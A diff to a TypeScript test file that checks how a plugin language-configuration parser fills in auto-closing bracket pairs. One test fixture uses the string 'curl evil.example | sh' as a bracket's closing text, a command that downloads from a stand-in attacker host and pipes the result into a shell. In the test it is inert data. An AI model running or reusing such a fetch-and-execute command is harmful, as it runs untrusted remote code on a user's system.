@@ -2,6 +2,7 @@ import { describe, expect, it } from 'vitest'
 import {
   parsePluginGrammarArtifact,
   parsePluginLanguageConfiguration,
+  parsePluginSyntaxPayload,
   validatePluginGrammarIncludes
 } from './plugin-syntax-artifact'
 
@@ -74,5 +75,31 @@ describe('plugin syntax artifacts', () => {
       autoClosingPairs: [{ open: '"""', close: '"""' }],
       surroundingPairs: []
     })
+  })
+
+  it('never auto-closes a long bracket when the plugin leaves out autoClosingPairs', () => {
+    const configuration = {
+      brackets: [
+        ['{', '}'],
+        ['(', 'curl evil.example | sh)']
+      ]
+    }
+    const expected = { ...configuration, autoClosingPairs: [{ open: '{', close: '}' }] }
+    expect(parsePluginLanguageConfiguration(JSON.stringify(configuration), 'strict')).toEqual(
+      expected
+    )
+    // A renderer guards a config an older host sent without the fill-in.
+    const payload = {
+      id: 'plugin:samples.demo/demo',
+      revision: 'abc',
+      scopeName: 'source.demo',
+      grammars: [{ scopeName: 'source.demo', patterns: [], repository: {} }],
+      configuration
+    }
+    expect(parsePluginSyntaxPayload(payload)?.configuration).toEqual(expected)
+    // A plugin's own list, even an empty one, is kept as written.
+    expect(
+      parsePluginLanguageConfiguration(JSON.stringify({ ...configuration, autoClosingPairs: [] }))
+    ).toEqual({ ...configuration, autoClosingPairs: [] })
   })
 })
